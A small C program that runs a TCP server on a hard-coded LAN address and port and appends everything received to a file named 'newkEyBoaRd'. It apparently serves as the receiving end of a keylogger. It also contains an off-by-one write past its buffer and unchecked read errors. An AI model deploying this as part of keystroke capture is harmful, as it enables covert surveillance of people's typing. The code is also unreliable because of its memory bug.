#include <linux/input.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#define MaxLen 1024
int main(int argc, char const *argv[])
{
	int count;
	count = 0;

/**************************************************************/	
	
	struct sockaddr_in Addr,PerrAddr;

	Addr.sin_family = PF_INET;
	Addr.sin_port = htons(1234);
	Addr.sin_addr.s_addr = inet_addr("192.168.1.3");

	int ServerSocket = socket(PF_INET,SOCK_STREAM,0);
	if(ServerSocket == -1)
	{
		perror("ServerSocket ");
	}

	int BindSocket = bind(ServerSocket,(struct sockaddr *)&Addr,sizeof(Addr));
	if(BindSocket == -1)
	{
		perror("BindSocket ");
	}
	int ListenSocket = listen(ServerSocket,10);
	if(ListenSocket == -1)
	{
		perror("ListenSocket ");
	}
	socklen_t PerrAddrLen = sizeof(PerrAddr);
	// printf("hello world1\n");
	int ClientSocket = accept(ServerSocket,(struct sockaddr *)&PerrAddr,&PerrAddrLen);
	if(ClientSocket == -1)
	{
		perror("ClientSocket ");
	}
	char buf[MaxLen];
	// printf("hello world2\n");

	int fd = open("./newkEyBoaRd",O_CREAT|O_APPEND|O_RDWR,0777);
	if(fd == -1)
	{
		perror("file open ");
	}
	bzero(buf,0);
	int ReadLen;
	while(1)
	{
		printf("hello world%d\n",++count);
		ReadLen = read(ClientSocket,buf,MaxLen);
		buf[ReadLen] = '\0';
		write(fd,buf,strlen(buf));

	}

	return 0;
}